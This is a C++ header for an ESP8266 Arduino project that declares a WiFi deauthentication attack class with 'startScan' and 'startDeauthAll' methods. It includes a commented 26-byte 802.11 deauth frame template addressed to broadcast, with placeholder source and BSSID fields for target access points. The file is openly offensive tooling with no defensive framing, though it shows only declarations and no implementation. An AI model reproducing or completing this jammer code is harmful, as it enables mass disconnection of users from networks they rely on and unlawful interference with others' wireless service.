#ifndef Deauth_h
#define Deauth_h

#include "Arduino.h"
#include <ESP8266WiFi.h>
#include "SimpleList.h"

extern "C" {
  #include "user_interface.h"
}

typedef struct APs {
  String ssid;
  uint8_t encryptionType;
  int32_t RSSI;
  uint8_t* BSSID;
  int32_t channel;
  bool isHidden;
  String s_bssid;
} AccessPoint;

class Deauth {
  public:
    Deauth();
    void startDeauthAll();
    void startScan();
  private:
    SimpleList<AccessPoint>* ap_list;
    uint8_t deauthPacket[26] = {
      /*  0 - 1  */ 0xC0, 0x00,                         // type, subtype c0: deauth (a0: disassociate)
      /*  2 - 3  */ 0x00, 0x00,                         // duration (SDK takes care of that)
      /*  4 - 9  */ 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // reciever (target)
      /* 10 - 15 */ 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, // source (ap)
      /* 16 - 21 */ 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, // BSSID (ap)
      /* 22 - 23 */ 0x00, 0x00,                         // fragment & squence number
      /* 24 - 25 */ 0x01, 0x00                          // reason code (1 = unspecified reason)
    };
};
#endif
